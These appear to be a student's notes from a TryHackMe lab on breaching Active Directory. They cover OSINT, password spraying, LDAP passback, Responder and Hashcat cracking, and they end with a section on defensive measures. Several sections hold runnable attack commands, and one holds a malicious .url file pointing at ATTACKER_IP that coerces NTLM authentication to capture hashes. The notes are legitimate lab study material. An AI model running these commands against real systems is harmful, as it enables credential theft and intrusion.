# Intro to AD Breaching – Notes & Tool Usage

**Date:** 21 June 2026
**Platform:** TryHackMe
**Room:** Intro to AD Breaching

---

# 1. OSINT & Information Gathering

Before attacking Active Directory, attackers gather information about the target organization.

## Common Sources

* Company websites
* LinkedIn employee profiles
* GitHub repositories
* Public code repositories
* Paste sites
* Breach databases
* Social media

## Useful Tools

### theHarvester

Collect emails, hosts, and employee information.

```bash
theHarvester -d company.com -b all
```

Example:

```bash
theHarvester -d megacorp.com -b linkedin
```

### GitHub Dorking

Search for:

```text
password
secret
apikey
token
username
```

Example:

```text
org:company password
```

### TruffleHog

Find secrets in Git repositories.

```bash
trufflehog https://github.com/company/repo.git
```

### Gitleaks

Scan repositories for exposed credentials.

```bash
gitleaks detect
```

---

# 2. Password Spraying

Password spraying involves testing a few common passwords against many user accounts.

## Why?

Avoid account lockouts while identifying weak passwords.

## Tool: NetExec (nxc)

```bash
nxc smb 192.168.1.10 -u users.txt -p Winter2025!
```

Example:

```bash
nxc smb 192.168.11.100 -u users.txt -p Password123!
```

## Tool: CrackMapExec

```bash
crackmapexec smb 192.168.11.100 -u users.txt -p Spring2025!
```

### Detection

Relevant Event IDs:

```text
4624 - Successful Logon
4625 - Failed Logon
```

---

# 3. Credential Exposure

Organizations often leak credentials unintentionally.

## Common Locations

* GitHub
* GitLab
* Jenkins
* Build logs
* Configuration files
* Backup files

### Search Through Files

```bash
grep -Ri password .
```

### Search for Secrets

```bash
grep -Ri "password\|secret\|token" .
```

---

# 4. LDAP Passback Attack

## Concept

Many network devices authenticate against AD using LDAP:

* Printers
* Scanners
* MFPs
* Network appliances

If LDAP settings can be modified, authentication can be redirected to an attacker-controlled host.

## Listener Setup

```bash
nc -lvnp 3489
```

### Example Output

```text
CN=svc.ldap,OU=Service Accounts,DC=thm,DC=loc
Password123!
```

## Verify Credentials

```bash
nxc smb 192.168.11.100 -u svc.ldap -p Password123!
```

Possible output:

```text
STATUS_ACCOUNT_DISABLED
```

Even if disabled, the credentials are valid.

---

# 5. File-Based Coercion

## Concept

Windows Explorer automatically renders file icons.

A malicious `.url` file can force SMB authentication to an attacker-controlled host.

### Malicious URL File

```ini
[InternetShortcut]
URL=http://thm.loc
WorkingDirectory=thm
IconFile=\\ATTACKER_IP\icons\icon.ico
IconIndex=1
```

### Upload File

```bash
smbclient //SERVER1.thm.loc/shared-docs -U 'THM\alice%Password'
```

```bash
put @Shortcut.url
```

### Why Use '@'?

```text
@Shortcut.url
```

Windows Explorer sorts it near the top, increasing the chance of automatic rendering.

---

# 6. Responder

Capture NTLM authentication attempts.

## Start Responder

```bash
sudo responder -I tun0
```

### Example Capture

```text
[SMB] NTLMv2-SSP Username : THM\sarah.jones
[SMB] NTLMv2-SSP Hash     : sarah.jones::THM:HASH
```

---

# 7. Cracking NetNTLMv2

Save the captured hash:

```bash
nano hash.txt
```

### Crack with Hashcat

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

### Common Hashcat Modes

| Mode  | Hash Type    |
| ----- | ------------ |
| 1000  | NTLM         |
| 5600  | NetNTLMv2    |
| 13100 | Kerberos TGS |

---

# 8. SMB Access

Connect to SMB shares:

```bash
smbclient //SERVER1/share -U user
```

Example:

```bash
smbclient //SERVER1/shared-docs -U 'THM\alice'
```

### Useful SMB Commands

List shares:

```bash
shares
```

Connect to share:

```bash
use SHARE1
```

List files:

```bash
ls
```

Download file:

```bash
get file.txt
```

Upload file:

```bash
put file.txt
```

---

# 9. Hashcat Reference

### NTLM

```bash
hashcat -m 1000 hash.txt rockyou.txt
```

### NetNTLMv2

```bash
hashcat -m 5600 hash.txt rockyou.txt
```

### Kerberoasting

```bash
hashcat -m 13100 service_ticket.txt rockyou.txt
```

---

# 10. Defensive Measures Learned

## Secrets Management

* Use HashiCorp Vault, Azure Key Vault, or AWS Secrets Manager.
* Scan repositories with TruffleHog and Gitleaks.
* Rotate exposed credentials immediately.
* Audit Git history for leaked secrets.
* Redact secrets in CI/CD logs.

## LDAP Security

* Use LDAPS (TCP 636) instead of LDAP (TCP 389).
* Restrict device management interfaces.
* Use dedicated low-privilege service accounts.
* Regularly audit network devices.

## File Share Security

* Apply least privilege permissions.
* Monitor `.url`, `.lnk`, `.scf`, and `desktop.ini` files.
* Audit suspicious SMB authentication activity.

## NTLM Hardening

* Disable NTLMv1.
* Enforce NTLMv2.
* Enable SMB signing.
* Block outbound SMB traffic.
* Migrate toward Kerberos authentication.

## Network Segmentation

* Separate management networks.
* Restrict access to internal services.
* Use MFA for critical services.
* Limit exposure of sensitive infrastructure.

---

# Tools Used

| Tool           | Purpose                   |
| -------------- | ------------------------- |
| theHarvester   | OSINT & Email Enumeration |
| GitHub Dorking | Secret Discovery          |
| TruffleHog     | Secret Scanning           |
| Gitleaks       | Credential Discovery      |
| NetExec        | Credential Validation     |
| CrackMapExec   | SMB Enumeration           |
| Netcat         | LDAP Passback Listener    |
| Responder      | NTLM Hash Capture         |
| Hashcat        | Password Cracking         |
| smbclient      | SMB Share Access          |

---

# Key Takeaways

* OSINT often reveals usernames and credentials.
* Password spraying remains effective against weak passwords.
* Git repositories frequently expose secrets.
* LDAP passback can leak plaintext credentials.
* File-based coercion can capture NTLMv2 hashes.
* Responder is a powerful credential-capture tool.
* Hashcat enables offline password cracking.
* SMB shares are common AD attack surfaces.
* Understanding authentication weaknesses is essential for AD Red Team operations.
